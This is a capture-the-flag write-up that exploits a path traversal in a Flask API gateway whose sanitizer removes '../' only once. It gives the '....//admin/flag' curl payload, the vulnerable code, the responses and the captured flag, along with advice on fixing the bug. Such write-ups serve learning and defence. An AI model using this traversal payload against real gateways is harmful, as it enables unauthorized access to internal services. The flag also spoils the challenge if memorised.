# Read Between the Lines

## Metadata

| Field | Value |
| --- | --- |
| Category | `api` |
| Difficulty | Medium |
| Points | 100 |
| Solves | 118 |
| First Blood | S3NSEI |

## Challenge Description

```text
ProfileHub is a microservice employee directory. A public gateway sits in front
of an internal backend and forwards along the requests it likes.
```

## Artifacts

The provided archive contained the public gateway source:

```text
public.zip
extracted/gateway.py
solve_read_between_lines.sh
```

The archive password from the challenge notes was:

```text
infected
```

Target used during the solve:

```text
https://f19f9d9a2a324f57.chal.ctf.ae
```

## Recon

I started by checking the provided archive:

```bash
7z l -pinfected public.zip
```

Relevant output:

```text
Listing archive: public.zip
Name
------------------------
gateway.py
```

The root API documentation exposed the public route map:

```bash
curl -k https://f19f9d9a2a324f57.chal.ctf.ae/
```

Representative response:

```json
{
  "service": "ProfileHub API Gateway",
  "endpoints": {
    "GET /api/users": "List all users",
    "GET /api/profile/<username>": "Get user profile",
    "GET /health": "Health check"
  },
  "note": "All profile requests are routed through our secure internal microservice."
}
```

That response mattered because it described a gateway in front of another
service. The source confirmed the same architecture:

```python
BACKEND_URL = f"http://{BACKEND_HOST}:{BACKEND_PORT}"
```

Normal public behavior worked as expected:

```bash
curl -k https://f19f9d9a2a324f57.chal.ctf.ae/api/users
```

Response:

```json
{"status":"ok","users":["alice","bob","carol","dave"]}
```

Requesting one normal profile also worked:

```bash
curl -k https://f19f9d9a2a324f57.chal.ctf.ae/api/profile/alice
```

Representative response:

```json
{
  "status": "ok",
  "profile": {
    "username": "alice",
    "role": "developer",
    "department": "Engineering"
  }
}
```

So the visible attack surface was not authentication. It was the gateway path
that accepts a user-controlled `<username>` and forwards it into an internal URL.

## Vulnerability

The vulnerable flow is in `extracted/gateway.py`, lines 53-74:

```python
@app.route("/api/profile/<path:username>")
def get_profile(username):
    if not username or len(username) > 128:
        return jsonify({"error": "Invalid username"}), 400

    safe_username = sanitize_path(username)

    internal_url = (
        f"{BACKEND_URL}/users/{safe_username}"
    )

    resp = http_client.get(internal_url, timeout=5)
```

The first suspicious artifact was `<path:username>`. In Flask, that converter
allows slashes inside the captured value. That is useful for legitimate nested
paths, but dangerous here because the captured value is appended directly after
`/users/` in a backend URL.

The intended defense is `sanitize_path()`, lines 17-21:

```python
def sanitize_path(user_input):
    """Neutralize path traversal sequences in user input."""
    cleaned = user_input.replace("../", "")
    cleaned = cleaned.replace("..\\", "")
    return cleaned
```

At first, a direct traversal attempt looks blocked. This request:

```bash
curl -k --path-as-is \
  https://f19f9d9a2a324f57.chal.ctf.ae/api/profile/../admin/flag
```

returned:

```json
{"error":"User not found"}
```

That result is consistent with the sanitizer deleting the literal `../`, leaving
`admin/flag`, and forwarding:

```text
/users/admin/flag
```

The bypass idea came from how the sanitizer is written: it strips `../` once,
but it does not canonicalize the path and does not repeat the cleanup until the
input is stable. PortSwigger documents nested traversal payloads such as
`....//`, which become `../` after the inner traversal sequence is stripped.

The same happens here:

```text
input to gateway:       ....//admin/flag
after replace("../",""): ../admin/flag
forwarded backend URL:  /users/../admin/flag
backend resolves path:  /admin/flag
```

The vulnerability is therefore a path traversal through a proxy/gateway boundary:
the public gateway tries to restrict callers to `/users/<name>`, but the
backend receives a canonicalizable path that escapes `/users/`.

## Exploitation

The exploit chain was:

1. Read the API documentation and source to identify the gateway/proxy pattern.
2. Confirm normal public routes: `/api/users` and `/api/profile/alice`.
3. Inspect the `<path:username>` route and see that `username` is appended to
   `BACKEND_URL + "/users/"`.
4. Test direct `../admin/flag` and observe that the literal sequence is removed.
5. Use a nested traversal sequence, `....//`, that survives the one-pass
   sanitizer as `../`.
6. Preserve the request path with `curl --path-as-is`.
7. Request `/api/profile/....//admin/flag` and read the backend's internal admin
   response.

The final request was:

```bash
curl -k --path-as-is \
  https://f19f9d9a2a324f57.chal.ctf.ae/api/profile/....//admin/flag
```

The response was:

```json
{
  "flag": "flag{46aca5d2ec863a86}",
  "message": "Internal admin access granted",
  "status": "ok"
}
```

`--path-as-is` is included in the final artifact because curl normally handles
some `/../` or `/./` path components before sending the request. The official
curl manual documents that this option tells curl not to squash those sequences.
Even though the nested payload also worked in my environment without the option,
the preserved-path form is the correct reproducible way to test this class of
bug.

## Technical Details

The important mistake is using string replacement as a security boundary:

```python
cleaned = user_input.replace("../", "")
```

String replacement does not answer the real security question: "after URL and
path normalization, is the backend path still under `/users/`?"

A safe implementation would validate a username as a username. For example, the
gateway could restrict it to an allowlist such as alphanumeric plus a small set
of safe characters, then reject anything containing `/`. If the application
really needed path-like values, it should canonicalize the final path and verify
that it remains inside the intended prefix before forwarding the request.

The one-pass cleanup creates the exact bypass:

```text
....//admin/flag
^^^^
contains "../" starting at the third dot

replace("../", "") removes that inner sequence

result: ../admin/flag
```

Then the backend receives:

```text
/users/../admin/flag
```

Any component that normalizes dot segments can interpret that as:

```text
/admin/flag
```

which is outside the public `/users/` namespace.

## Exploit Artifact

The final artifact is [solve_read_between_lines.sh](solve_read_between_lines.sh).
It sends the nested traversal payload to the profile gateway route.

Usage:

```bash
chmod +x solve_read_between_lines.sh
./solve_read_between_lines.sh https://f19f9d9a2a324f57.chal.ctf.ae
```

The script prints the JSON response containing the flag.

## Validation

Health check:

```text
HTTP/1.1 200 OK
{"status":"healthy"}
```

Normal profile request:

```json
{"profile":{"username":"alice","role":"developer"},"status":"ok"}
```

Direct traversal control:

```text
/api/profile/../admin/flag -> {"error":"User not found"}
```

Nested traversal exploit:

```json
{"flag":"flag{46aca5d2ec863a86}","message":"Internal admin access granted","status":"ok"}
```

## References

- <https://portswigger.net/web-security/file-path-traversal>
- <https://curl.se/docs/manpage.html#--path-as-is>

## Flag

```text
flag{46aca5d2ec863a86}
```
